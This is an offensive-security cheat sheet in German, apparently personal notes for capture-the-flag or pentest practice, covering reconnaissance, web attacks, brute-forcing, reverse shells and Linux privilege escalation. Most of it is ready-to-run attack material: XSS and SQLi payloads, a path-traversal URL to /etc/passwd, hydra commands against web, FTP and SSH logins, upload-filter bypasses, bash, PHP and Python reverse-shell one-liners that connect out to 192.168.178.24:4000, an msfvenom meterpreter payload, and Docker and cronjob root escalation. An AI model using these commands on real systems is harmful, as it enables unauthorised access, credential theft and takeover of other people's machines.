> [!info]
> Hacktools: https://hacktools.sh/
> Wappalyzer: https://www.wappalyzer.com/

## Initial Access

1. IP range scannen (Ping scan)

```bash
nmap -sn 127.0.0.1/24 -v
```

2. IPs nach Ports scannen (Einfach aggressive mit allen Ports)

```bash
sudo nmap -A -p- 127.0.0.1
```

Oder schlauer Command (props an Rh17S15):
```bash
nmap -sCV -A -p $(nmap 127.0.0.1 -p- | grep open | awk -F '/' '{print $1}' | tr '\n' ',' | sed 's/.$//') 127.0.0.1
```

Alternative:
```bash
nmap -sS -p- 127.0.0.1 -v
```

3. IPs nach vulnerabilities scannen

```bash
nmap --script vuln 127.0.0.1 -v
```

### Webserver

1. Webseite querien

2. Mit Gobuster (oder dirb) directories durchgehen (muss davor installiert werden):
```bash
gobuster dir -u 127.0.0.1 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```
Achtung: Gobuster ist schnell aber nicht rekursiv -> Man muss manuell gefundene Subdomains nochmal durchsuchen

3. Paar Sachen die man noch checken kann:
- /robots.txt -> Irgendwelche interessanten subdomains? (Loginseiten, versteckte dev Seiten)
- Mit Browserextension Wappalyzer checken welche Versionen -> Sind welche veraltet? (oft js und wordpress plugins) -> ExploitDB
- Welches Framework wird verwendet? (php, html, js) -> Einfach mal testen ob es /login.php, /login.html oder so gibt (Grundsätzlich sieht man das über Wappalyzer)
- Webseiten source code -> Gibts dev Kommentare? Hardcoded credentials? Veraltete Versionen?
- Wenn es ein Wordpress Server ist, kann man wp-scan nutzen:
```bash
wpscan --url http://127.0.0.1/ --plugins-detection aggressive
```

#### XSS, SQLi
Wenn es Input Felder gibt, kann man testen ob cross-site-scripting oder SQL injections funktionieren:

XSS (testen):
```
<script>alert('XSS')</script>
```

SQLi (umgeht authentication):
```SQL
or true--
```

=> Browserextension Hacktools hat sehr viele Beispiele zum testen (Achtung bei SQLi kann man auch die Datenbank zerschießen)

Manchmal gibt es auch commands, die direkt auf dem Server ausgeführt werden z.B. um Inhalte von Dateien auszugeben (cat file.txt) -> Kann man andere commands ausführen? (Reverse shell, directory traversal, ssh)

#### Directory traversal

Manche Webserver rufen Unterseiten mit URLs auf ->
https\[:]//127.0.0.2/site.php?file=index.html ->
Kann man andere Dateien auf dem Server aufrufen
z.B. https\[:]//127.0.0.2/site.php?file=./../../../../etc/passwd

#### Authentication umgehen
Wenn man einen Login gefunden hat gibt es mehrere Wege um es zu umgehen:

1. Default Passwörter -> Manche Frameworks haben default Passwörter, die aus Faulheit nicht geändert werden -> Googlen ob es default credentials gibt

2. Bruteforce

Hat man einen User? (Aus Unterseiten (z.B. Aboutpage) oder Kommentaren in Source Code) -> Ansonsten gibt es wordlists mit common usernames (dabei kann man auch testen, ob die Login page unterscheidet zwischen falschen Passwort und User nicht gefunden)

Beispiel Hydra:
```bash
hydra -l user -P /usr/share/wordlists/rockyou.txt 127.0.0.1 http-post-form "/login:username=^USER^&password=^PASS^:Invalid Password!" -V
```

- Aufbau der Nachricht kann aus GET request im Browser abgelesen werden
- Hinter die Nachricht Fehlermeldung bei failed login


3. Session Hijacking

Dabei übernimmt man eine autorisierte Session eines anderen Users oder verändert den Cookie so, dass man ohne Authentifizieren sich anmelden kann.

4. SQLi

Siehe oben aber z.B.
```SQL
or true--
```

#### Uploads

Manche Webseiten bieten Uploads für Bilder ö.äh an -> Ziel ist es eine Reverse Shell hochzuladen (Hacktools, Revshells)

- Man kann Dateiendungsfilter oftmals umgehen z.B. statt revshell.php -> revshell.PhP oder revshell.php3
- Manchmal wird einfach nur nach Endungen gesucht also geht sowas wie revshell.jpg.php
- Magic numbers umgehen -> 4 Buchstaben z.B. (AAAA) an Anfang von Shell schreiben, dann mit hexeditor öffnen und "`41 41 41 41`" durch "`FF D8 FF DB`" ersetzen -> Das Ding ist jetzt laut `file` ein JPEG image

Wenn man die Reverseshell hochladen konnte muss man sie ausführen:
- Directory Traversal
- /uploads folder
- XSS

Bei Reverseshells vorher Listener:
```bash
nc -lvnp 4000
```

### FTP

Ist Annonymous login erlaubt? (Sieht man meistens schon im nmap scan)

```bash
ftp 127.0.0.1

Name: annonymous
Password: password (oder Enter)
```

Kein Annonymous login erlaubt? -> Bruteforcen
```bash
hydra -l user -P /usr/share/wordlists/rockyou.txt ftp://127.0.0.1 -V
```

Welche FTP Version ist das und gibt es Sicherheitslücken? (ExploitDB, Google)

### SSH

1. Man legt seinen public ssh-key auf dem Opfersystem im Ordner .ssh des Users ab -> Dann sollte man mit: 

```bash
ssh user@127.0.0.1
```

drauf kommen


2. Ansonsten Bruteforcen

```bash
hydra -l user -P /usr/share/wordlists/rockyou.txt 127.0.0.1 ssh -t 4 -V
```


3. Auch hier wieder SSH Version checken und schauen ob es vulnerabilities gibt (ExploitDB, Google, GTFObins)

4. Passwörter die wo anders verwendet wurden nochmal versuchen

5. Kann man den private ssh-key von einem User extrahieren? (Über Exploit oder directory-traversal)
```bash
# SSH-Key in Datei schreiben
echo "<Private ssh-key>" >> ssh-key

# Berechtigungen von SSH-Key verändern, sonst wirft ssh error
sudo chmod 600 ssh-key

# SSH verwenden mit dem key
ssh user@127.0.0.1 -i ssh-key
```


## Persistance

#### Reverse Shell

Es gibt 2 Wege Reverse Shells zu erstellen:

1. Commands (Hacktools/Revshells hat da einige anzubieten)

```bash
bash -c 'exec bash -i &>/dev/tcp/192.168.178.24/4000 <&1'
```

```php
php -r '$sock=fsockopen(getenv("192.168.178.24"),getenv("4000"));exec("/bin/sh -i <&3 >&3 2>&3");'
```

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.178.24",4000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

2. Über ein Payload
	- Einfach googeln nach der Revshell z.B. php reverseshell
	- Mit Metasploit eine erstellen
	
```bash
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform windows -f exe LHOST=192.168.178.24 LPORT=4000 -o ./payload.exe
```


Wenn man eine Reverse Shell hat sollte man sie bei (Unix) Systemen harden, damit sie bei "ctrl + c" nicht abstürzt und dass autocomplete dabei ist.

```python
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

```bash
export TERM=xterm
```

```bash
Ctrl + Z
```

```bash
stty raw -echo; fg
```

```bash
stty rows 38 columns 116
```


Was auch praktisch ist, ist mehrere Shells ineinander zu spawnen (Redundanz)

```bash
/bin/sh -i
```

```bash
echo os.system("/bin/bash")
```

## Lateral Movement

1. Einfach bisschen untersuchen welche Dateien rumliegen -> Downloads, Documents etc.
2. Dateiberechtigungen überprüfen

Paar Ordner die man checken kann:
```bash
# Liegen interessante Dateien in den home Ordnern
/home/user/Downloads
/home/user/Documents
/home/user/.bash_history
/home/user/.zsh_history

# Irgendwelche Auffälligkeiten/Abweichungen im root folder
/

# Ist irgendwas gemounted
/mnt/
```

Was steht so in der history:
```bash
history
```
## Privilege Escalation
### Commands

Command um checken ob sudo falsch konfiguriert ist:
```bash
sudo -l
```

SUID sind Dateien die immer als der Owner ausgeführt werden -> Man sucht Dateien, die man ausführen kann aber die dann von root ausgeführt werden -> Reverseshell

SUID commands:
```bash
find / -user root -perm /4000 2>/dev/null

find / -perm -u=s -type f 2>/dev/null

find / -type f -name '*.txt' 2>/dev/null

find / -user root -perm -4000 -exec ls -ldb {}; > /tmp/suid

getcap -r / 2>/dev/null
```

=> Findet man Dateien oder Versionen von Applikationen kann man die in https://gtfobins.github.io/ nachschauen z.B. wenn man Berechtigungen hat Docker zu starten:
```bash
# Erstellt eine Root Shell mit Docker
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```
### Cronjobs
Cronjobs sind jobs die z.B. Skripte ausführen

Ziel ist dabei ein cronjob zu finden, der von root ausgeführt wird und wo man die Datei verändern kann -> Reverse shell

Paar commands für cronjob stuff:
```bash
# Cronjobs für andere user
crontab -l -u <username>

# Cronjobs für sich selbst
crontab -l

# Cronjobs von root
sudo crontab -l # Oft in Verbindung mit sudo -l
cat /etc/crontab
cat /etc/cron.d/*

# Suche nach cronjobs, die auf beschreibare Dateien zeigen
find /etc/cron* /var/spool/cron -type f -exec ls -l {} \;
```

(Mehr cronjob commands sind in Hacktools zu finden)

Manchmal muss man auch nicht wissen ob es cronjobs gibt um es zu testen
-> Findet man ein z.B. Skript, dass man bearbeiten kann sollte man da einfach mal testweise eine Reverseshell reinpflanzen und schauen ob die Datei vielleicht regelmäßig von einem cronjob ausgeführt wird

### GTFO Bins
https://gtfobins.github.io/

Manchmal findet man Informationen zum System oder veraltete Versionen, die man dann einfach mal in GTFO bins nachschauen kann.

Alternativ kann man mal commands ausprobieren, für "SUDO", "SUID", "Limited SUID"

### Scripte

Paar Skripte, die man nutzen kann:
- LinPeas, WinPeas
- Privesccheck

=> Machen viele Ding automatisiert und präsentieren das ganze anschaulich

Tipp:
Linpeas mit tee -a ausführen um in Datei zu schreiben (Damit man Command nicht mehrmals laufen lassen muss):

```bash
./linpeas.sh | tee -a output.txt 
```
